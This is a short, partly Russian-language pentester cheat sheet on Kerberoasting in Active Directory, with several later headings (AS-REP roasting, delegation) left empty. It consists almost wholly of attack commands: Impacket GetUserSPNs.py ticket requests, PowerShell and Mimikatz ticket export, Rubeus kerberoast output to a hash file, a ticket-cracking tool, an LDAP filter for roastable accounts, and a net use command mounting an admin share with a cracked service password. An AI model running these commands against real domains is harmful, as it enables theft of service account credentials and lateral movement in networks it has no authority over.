## Kerberoasting (NEED CREDENTIALS!):  
1) GetUserSPNs.py domain.local/user:password - RECON SPNs  
2) GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.com/username  
3) GetUserSPNs.py domain.local/user:password -dc-ip [DC IP] -request  
4) Windows: setspn -T DomainName -Q \*/\*  
    - загружаем билеты в память для дальнейних действий.  
            - Add-Type -AssemblyName System.IdentityModel  
            - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSERVER/SQL-Server.testdomain.com:1433"  
            - Проверяем, что билет загружен в память: klist  
            - Invoke-Mimikatz –Command '" kerberos::list"' /export (модуль PowerSploit)  
              - Софт для перебора билета tgsrepcrack.py https://github.com/nidem/kerberoast  
            - После взлома пароля: net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password1  
 5) Windows: Rubeus.exe kerberoast /outfile:hashes.txt  
 
Всех пользователей, у которых можно выгрузить TGS-билет, можно найти поисковым LDAP-фильтром: (&(samAccountType=805306368)(servicePrincipalName=*))

## ASREP Roasting:  


## Unconstrained Delegation:  


## Constrained Delegation:  


## Alternate Service Name:  


## 
